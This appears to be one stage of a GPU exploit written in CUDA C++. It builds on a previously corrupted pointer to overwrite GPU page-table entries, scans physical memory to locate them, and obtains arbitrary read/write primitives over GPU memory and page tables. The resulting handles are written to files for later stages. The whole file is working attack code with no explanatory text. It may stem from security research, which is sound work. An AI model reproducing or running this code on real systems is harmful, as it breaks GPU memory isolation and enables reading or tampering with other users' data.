#include "./s4_secondRegion.cuh"
#include <iostream>
#include <fstream>

static void
removeFirstArg (int &argc, char *argv[])
{
  for (int i = 1; i < argc; ++i)
    argv[i - 1] = argv[i];
  argc -= 1;
  argv[argc] = nullptr;
}

int
main (int argc, char *argv[])
{
  if (argc <= 1)
  {
    std::cout << "Not enough arguments.\n";
    return 0;
  }

  removeFirstArg (argc, argv);
  GPUBreachContext ctx = second_PT_region (argc, argv);

  auto &cudaMalloced_ptrs = ctx.step4_data.cudaMalloced_ptrs;
  auto &corrupted_ptr = ctx.step3_data.corrupted_ptr;

  std::cout << (void*)cudaMalloced_ptrs[0] << ' ' << cudaMalloced_ptrs.size() << ' '<< (void*) corrupted_ptr <<'\n';
  pause();
  
  char * flush_ptr;
  uint8_t *data_device_ptr;
  uint64_t flush_size = 4L * 1024 * 1024 * 1024;
  cudaMallocManaged(&flush_ptr, flush_size);
  cudaMallocManaged(&data_device_ptr, 2L * 1024 * 1024);

  initialize_memory_loop<<<1,1>>>((uint8_t*)flush_ptr, flush_size);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());

  // Generate 64KB Pages
  gen_64KB(flush_ptr, flush_size);

  // Flush
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());

  std::cout << "ok"
            << '\n';
  // find virtual address of the 4KB frame

  uint64_t arb_rw_ofs;
  
  uint64_t initial_offset_1;
  uint64_t initial_offset_2;

  std::cout << "Please select two 2MB PTE addresses and enter them:" << '\n';
  std::cout << "Enter the first one:" << '\n'; std::cin.clear();
  std::cin >> std::hex >> initial_offset_1;
  std::cout << "Enter the second one:" << '\n'; std::cin.clear();
  std::cin >> std::hex >> initial_offset_2;
  std::cin >> std::dec;

  std::cout << initial_offset_1 << ' ' << initial_offset_2 <<'\n';

  void* arb_rw_orig_ptr = nullptr;
  void* arb_rw_ptr = nullptr;
  void* pt_rw_orig_ptr = nullptr;

  // cudaMemcpyArray(corrupted_ptr + 0xc100, data_device_ptr, 8);
  cudaMemcpyArray(data_device_ptr, corrupted_ptr + initial_offset_1, 8);
  arb_rw_orig_ptr = *(void**)data_device_ptr;

  cudaMemcpyArray(data_device_ptr, corrupted_ptr + initial_offset_2, 8);
  pt_rw_orig_ptr = *(void**)data_device_ptr;
  std::cout << "Phys: " << pt_rw_orig_ptr << ' ' << arb_rw_orig_ptr << '\n';

  memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_1, (uint64_t)(0x60000000000001), 8);
  cudaDeviceSynchronize();
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());
  
  for (int j = 0; j < cudaMalloced_ptrs.size(); j++)
  {
    cudaMemcpyArray(data_device_ptr, (uint8_t*)cudaMalloced_ptrs[j], 8);
    std::cout << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << '\n';
    if (*(void**)data_device_ptr !=  (void *)cudaMalloced_ptrs[j])
    {
      std::cout << "Arb:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n';
      arb_rw_ptr = (void *)cudaMalloced_ptrs[j];
      arb_rw_ofs = j;
      break;
    }
    gpuErrchk(cudaPeekAtLastError());
  }

  pause();
  // find physical location of pointer_to_find
  uint64_t it_ptr = (uint64_t)(0x60000000000001);
  uint64_t target_pte_ofs = ((uint64_t)corrupted_ptr + initial_offset_1) % (2L * 1024 * 1024);
  for (uint64_t i = 0; i < (uint64_t)23L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
    {
      if (i > (uint64_t)12L * 1024 * 1024 * 1024)
      {
        // gen_64KB(flush_ptr, flush_size);
        
        memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_1, it_ptr, 8);
        cudaDeviceSynchronize();
        gen_64KB(flush_ptr, flush_size);
        simple_flush<<<1,1>>>(flush_ptr, flush_size);
        cudaDeviceSynchronize();
        cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr + target_pte_ofs, 8);
        // cudaMemcpy(&value_of_pointer, (uint8_t*)arb_rw_ptr + ((uint64_t)corrupted_ptr + 0xc100) % (2L * 1024 * 1024), 8, cudaMemcpyDeviceToHost);
        std::cout << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
        if (*(void**)data_device_ptr == (void*)it_ptr)
        {
          std::cout << *(void**)data_device_ptr << '\n';
          break;
        }
        cudaDeviceSynchronize();
        gpuErrchk(cudaPeekAtLastError());

        
      }
      it_ptr += 0x20000;
    }
  pause();
  uint64_t pt_entry_phys = it_ptr;
  void* pt_rw_ptr = nullptr;
  uint64_t pt_rw_ofs;
  // Set another cudaMalloc to this:
  memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_2, pt_entry_phys, 8);
  cudaDeviceSynchronize();
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();

  for (int j = 0; j < cudaMalloced_ptrs.size(); j++)
  {
    cudaMemcpyArray(data_device_ptr, (uint8_t*)cudaMalloced_ptrs[j], 8);
    if ((void *)cudaMalloced_ptrs[j] != arb_rw_ptr && *(void**)data_device_ptr !=  (void *)cudaMalloced_ptrs[j])
    {
      std::cout << "PT rw:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n';
      pt_rw_ptr = (void *)cudaMalloced_ptrs[j];
      pt_rw_ofs = j;
      break;
    }
  }


  cudaIpcMemHandle_t pt_handle;
  cudaIpcMemHandle_t arb_handle;
  cudaIpcGetMemHandle(&pt_handle, pt_rw_ptr);
  cudaIpcGetMemHandle(&arb_handle, arb_rw_ptr);

  std::ofstream file_pt("cuda_ipc_pt.bin", std::ios::binary);
  file_pt.write(reinterpret_cast<char*>(&pt_handle), sizeof(pt_handle));
  file_pt.close();

  std::ofstream file_arb("cuda_ipc_arb.bin", std::ios::binary);
  file_arb.write(reinterpret_cast<char*>(&arb_handle), sizeof(arb_handle));
  file_arb.close();

  cudaMemcpyArray(data_device_ptr, (uint8_t*)pt_rw_ptr + target_pte_ofs, 8);
  std::cout << "PT rw:" << *(void**)data_device_ptr <<  " Orig: "<< pt_rw_orig_ptr << '\n';
  cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 8);
  std::cout << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';

  std::cout << "Wrote CUDA IPC handles to file\n";
  pause();

  // find orig pte entries:
  //   for pt, make it the arb's physical location + offset
  uint64_t arb_location = 0;
  uint64_t pt_location = 0;
  uint64_t arb_location_ofs = 0;
  uint64_t pt_location_ofs = 0;
  it_ptr = (uint64_t)(0x60000000000001);
  for (uint64_t i = 0; i < (uint64_t)46L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
    {
      if (i > (uint64_t)12L * 1024 * 1024 * 1024)
      {
        memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, it_ptr, 8);
        cudaDeviceSynchronize();
        gen_64KB(flush_ptr, flush_size);
        simple_flush<<<1,1>>>(flush_ptr, flush_size);
        cudaDeviceSynchronize();

        cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 2L * 1024 * 1024);
        std::cout << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
        for (int z = 0; z < 2L * 1024 * 1024; z+=8)
        {
          if (*(void**)(data_device_ptr + z) == arb_rw_orig_ptr)
          {
            arb_location = it_ptr;
            arb_location_ofs = z;
            std::cout << "Found" << '\n';
          }
          if (*(void**)(data_device_ptr + z) == pt_rw_orig_ptr)
          {
            pt_location = it_ptr;
            pt_location_ofs = z;
            std::cout << "Found" << '\n';
          }
        }
        
        if (arb_location != 0 && pt_location != 0)
        {
          break;
        }
        cudaDeviceSynchronize();
        gpuErrchk(cudaPeekAtLastError());   
      }
      it_ptr += 0x20000;
    }
  pause();

  // set new pt rw ptr to the PT's 2MB page
  // pass new arb_location offset through file.
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();

  memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, pt_location, 8);
  cudaDeviceSynchronize();

  memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr + pt_location_ofs, pt_location, 8);
  cudaDeviceSynchronize();

  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();

  std::ofstream new_ofs_file("new_offset.bin", std::ios::binary);
  new_ofs_file.write(reinterpret_cast<char*>(&arb_location_ofs), sizeof(arb_location_ofs));
  new_ofs_file.close();

  pause();

  return 0;
}